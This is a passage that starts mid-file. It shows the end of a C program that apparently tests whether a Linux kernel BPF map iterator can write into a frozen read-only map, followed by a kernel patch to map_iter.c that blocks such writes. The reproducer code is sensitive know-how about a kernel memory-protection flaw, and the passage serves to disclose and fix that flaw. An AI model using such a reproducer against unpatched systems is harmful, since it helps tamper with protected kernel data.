	link_fd = bpf_link_create(prog_fd, 0, BPF_TRACE_ITER, &iopts);
	if (link_fd < 0) {
		printf("[+] link_create rejected on patched kernel: %s\n",
		       strerror(errno));
		goto out;
	}

	iter_fd = bpf_iter_create(link_fd);
	if (iter_fd < 0)
		goto out;

	n = read(iter_fd, buf, sizeof(buf));
	if (n < 0)
		goto out;

	if (!bpf_map_lookup_elem(map_fd, &key, &out) && out == POISON_VAL) {
		printf("[!] VULNERABLE: frozen rdonly map mutated to 0x%llx\n",
		       (unsigned long long)out);
		ret = 0;
	}

out:
	if (iter_fd >= 0)
		close(iter_fd);
	if (link_fd >= 0)
		close(link_fd);
	if (prog_fd >= 0)
		close(prog_fd);
	if (map_fd >= 0)
		close(map_fd);
	return ret;
}

 kernel/bpf/map_iter.c | 12 +++++++++---
 1 file changed, 9 insertions(+), 3 deletions(-)

diff --git a/kernel/bpf/map_iter.c b/kernel/bpf/map_iter.c
index a58c148692e6..b9c2135a4b8c 100644
--- a/kernel/bpf/map_iter.c
+++ b/kernel/bpf/map_iter.c
@@ -100,15 +100,21 @@ static struct bpf_iter_reg bpf_map_reg_info = {
 /*
  * For an iterator that hands the live map value to the program as a writable
- * buffer: the verifier knows nothing of the map, so the special fields of the
- * value have to lie outside of what the program may write.
+ * buffer: the verifier knows nothing of the map, so read-only / frozen maps
+ * and special fields of the value have to be protected from writes.
  */
 int bpf_iter_map_check_value_write(const struct bpf_prog *prog,
 				   const struct bpf_map *map)
 {
 	const struct btf_record *rec = map->record;
 	const struct btf_field *field;
 	u32 i;
 
-	if (IS_ERR_OR_NULL(rec) || !prog->aux->max_rdwr_write)
+	if (!prog->aux->max_rdwr_write)
+		return 0;
+
+	if ((map->map_flags & BPF_F_RDONLY_PROG) || READ_ONCE(map->frozen))
+		return -EACCES;
+
+	if (IS_ERR_OR_NULL(rec))
 		return 0;
 
 	for (i = 0; i < rec->cnt; i++) {
-- 
2.43.0
